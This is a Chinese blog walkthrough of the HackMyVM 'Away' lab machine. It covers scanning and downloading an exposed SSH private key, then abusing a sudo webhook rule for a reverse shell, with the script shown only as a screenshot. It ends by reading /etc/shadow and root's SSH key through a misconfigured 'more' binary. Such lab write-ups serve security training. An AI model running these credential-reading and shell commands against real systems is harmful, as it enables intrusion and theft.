> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8hccXVDr2TsVtenTFDWluA)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 110 篇原创内容  公众号

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghAu4tGxzQgIcRsAbiaYRvX87t2ujS9BX4v0GAhZG3COE2TAaw09m1WGhg/640?wx_fmt=png)

靶机信息
----

下载地址:

```
https://hackmyvm.eu/machines/machine.php?vm=Away
网盘链接：https://pan.baidu.com/s/1OjMwuU6F1V98x2UnLz-eHA?pwd=xcvx
```

靶场: HackMyVm.eu

靶机名称: Away

难度: 中等

发布时间: 2022 年 6 月 17 日

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Vbox Manjaro 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only

靶机:Vbox linux IP自动获取 网卡host-Only
```

信息收集
----

### 扫描主机

扫描局域网内的靶机 IP 地址

```
fscan -h 10.0.0.0/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy0ppaiblMPsTEVvKCJ8E1XmaUxDibfMq7ficYkokOwUaUkl9JNnzSoqSEQ/640?wx_fmt=png)

扫描到主机地址为 10.0.0.180

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sCV -p22,80 10.0.0.180 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsytfEgFHFnaoo7cia76mgp34Wa7ZuwoPUc65y55h9FLibNibzVXMh08fGOQ/640?wx_fmt=png)

扫描到开放 22 和 80 端口，先来看看 80 端口

Web 渗透
------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy2ZWhI2L3qryN7CB5jfiazD2iaYclZxDQnD8kqd7O90aqZiav26RpqO7Og/640?wx_fmt=png)

访问后提示登录 tula，下方的内容看起来很熟悉，像是平时使用 ssh-keygen 生成 key 文件显示的结果，来对比一下

```
ssh-keygen
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyBXaiciaHdPt2PTaFT46DkFKWs4rGo9BStf3XRcpVuPIYuHUQFdFgZR2w/640?wx_fmt=png)

这里可以看到生成的 key 文件密钥长度是 RSA 3072 位，网站上显示的是 ED25519 256，来看看这个 ed25519 是什么

```
https://wentao.org/post/2021-04-25-upgrad-ssh-key/
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyln6e7ibYhE4jDkVIRW4BJOH3Y9ibic7nCYL7PEmC1pCxawFCFt1YUwhlA/640?wx_fmt=png)

搜索引擎中随便找了下，发现是替代 rsa 算法安全性更高的算法，来生成一个看看

```
ssh-keygen -t ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyibHia5Jmf0sbybVnO3YuQDn6jrt6vns8QEYAPiawwPicuIsAZJlrehT20w/640?wx_fmt=png)

与网站上的提示相符，并且可以看到默认名称为 id_ed25519，来看看网站上是否提供了这个文件下载

```
wget http://10.0.0.180/id_ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyLRBByeuX3Y1OKNic9qfc3jgrd48KBZQ6pWA1WDPGADBdiax3QMq0scpg/640?wx_fmt=png)

```
cat id_ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy1lEPPPXMBq4csI6e3IAYQc6Kiamv2kmtNYovrbbpNcrcz9BQnp90lFA/640?wx_fmt=png)

拿到私钥，看看有没有公钥

```
wget http://10.0.0.180/id_ed25519.pub
cat id_ed25519.pub
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyedXWXYZcFiao8L8NhgRWKsSJtQ5yKHXYJWdA1VzxpLeru0oydZIbu7Q/640?wx_fmt=png)

公钥里面有个密码 Theclockisticking，先记下来。拿到密钥加上之前提示的账号，尝试登录 SSH

```
chmod 600 id_ed25519
ssh tula@10.0.0.180 -i id_ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyiahcxicq0udnIIuVmWg2ROJgU0rfMjzKtHzEV2NVUFgwaV9K3sp6dbFw/640?wx_fmt=png)

登录后提示需要密码，使用公钥中提示的密码登录成功。来找找敏感信息

```
ls
cat user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyjAEu6lnJ022U3RHRlsyaUbTykt18UibmytYPdxXd0KujWv1iahqJdNQw/640?wx_fmt=png)

拿到 user.txt，继续

```
cat /etc/passwd |grep bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsytcuxtuGWnYjOYnOkxjiaynKkLRDLj2yCfIKMOWgXsyGISxkaUg7GdkA/640?wx_fmt=png)

发现另一个普通用户 lula，继续找提权信息

```
sudo -l
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyttOATdiaj0j5V1ibGbqvwibaFMwDDrjySXic9ZxTApumbTvUqGxDicVpZ3g/640?wx_fmt=png)

发现可以使用 lula 身份执行 webhook 命令不需密码，来看看这个 webhook 如何提权

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyDQzcbvZeibgtWFM46Ekzo2RJlaL78TQbWcYa8Mg8yiafmhzuhNr3NKtg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyG4pcRQyKAXM8ZoHiaUO8Suwl9GddCZeDuJgBdI4gRyTT43mKib7c1UvA/640?wx_fmt=png)

文章中说可以创建一个 hooks.json 文件，里面可以加入需要执行的脚本路径，并告知如何运行。来验证下

1。创建 hooks.json 配置文件

```
nano hooks.json
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy4yn5qU4jqS8gTZUrz1nCOPriaW9mskoPSCcWXrK8zlg5H3p1KnBZibxg/640?wx_fmt=png)

2。创建 test.sh 脚本，这个脚本执行反弹 shell 回到攻击机

test.sh

```
nano /tmp/test.sh
chmod +x /tmp/test.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyCBBLC0T5hSKibMsPtnJPuIWia7EGv7kvPTPeshLH9DVRPsefem4BlIbw/640?wx_fmt=png)

3。攻击机监听 4444 端口

```
nc -nlvp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy4ib1UUmHWibJYqIMMtKkZQWrtC8GxtVkYYEm2fwfY3Iib4rWfaV8UiatgQ/640?wx_fmt=png)

3。运行 webhook

```
sudo -u lula /usr/bin/webhook -hooks hooks.json -verbose
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyzOqZaHb036Y3gfTGYY6zkFiaRC6XA6Tbx74FTdr4NVdXdZrVqTpO25g/640?wx_fmt=png)

运行后发现需要输入 id 参数，又看了下刚才的 json 文件里面有个定义 id 为 cleanup-webhook，来访问下

```
curl http://10.0.0.180:9000/hooks/cleanup-webhook
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyxnSHHwvDN2Z3MFsxLF5RqUE0z2ZlxeS9I4z938bB4k5PLPbvHXysmg/640?wx_fmt=png)

反弹成功拿到 lula 权限，切换到交互式 shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+z快捷键
stty raw -echo;fg
reset
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsym6F0wCOUU8U1cmAZbTwDuIpcoY5Q4YcEVibBxnlwUPPH6EHSISMcUSA/640?wx_fmt=png)

切换完成，使用辅助脚本来查找敏感信息 (手动查找未发现)，

1。攻击机在脚本目录下开启 HTTP 服务

```
python3 -m http.server
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsymh0nOic5mcXwicgXd4n7HKM92mtsEibB1URkgJRfACOpavwXUr6iceVjIQ/640?wx_fmt=png)

2。靶机下载辅助脚本并执行

```
cd /tmp
wget http://10.0.0.3:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyFPcR4icWibwVRtQOavUozmTX8hpibaL3V3dBOJC2rA6RAvJaNZQvzicI7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsymdCkvdlMEX5OVicnibqIWvKicyKIx5fCbZLZt6Q4vrKXR6I0txOt92PbA/640?wx_fmt=png)

发现 / usr/bin/more 在 lula 组中，来试试能否使用这个命令越权读取文件

```
/usr/bin/more /etc/shadow
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy3CcKuTUCUryc8YOnDwhMmUYT5u2ldiaZILsIpheY9896bZg0MnntQibQ/640?wx_fmt=png)

可以读取，尝试读取 root 用户目录下的. ssh 文件夹

```
/usr/bin/more /root/.ssh/id_ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyk7BLBGaNGRxibPg7qwuoMjbJDSZbfu1vnZ5YWqibwOvqTCOE508W9kKQ/640?wx_fmt=png)

读取成功，保存后尝试以 root 身份登录 ssh

```
nano root_ed25519
chmod 600 root_ed25519
ssh root@10.0.0.180 -i root_ed25519
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsy3JXDR3DuZ8D47uKm2Fk9jwwNv4Mfx1jAlWCoWYnVibMFiatUw7aeZ9ibA/640?wx_fmt=png)

登录成功，拿到 root 权限 ，来找下 flag

```
ls
cat ro0t.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtoXUMgnMpeGzbSKDapEVsyEz57q8JLSDibZ3xWCcoF0TN4aA39SiaCDQSUwuEywIDuvWaulVbhsSHA/640?wx_fmt=png)

拿到 root.txt，游戏结束。

还是离线的靶机好打，一两个小时就能打完一台，在线靶机实在是太折磨人了。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghASaTvKqrr5oviaDdRNIB3brRen4Pk1YST6D74jlejaMedJeG5Led8k5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUtcr33Ov5tbqz0BvQHnPnI0nAodhBWJazcG4gzDkic1CnOcujlia3G0IyCn3YCnsq0c78JYJcZGeJyg/640?wx_fmt=jpeg)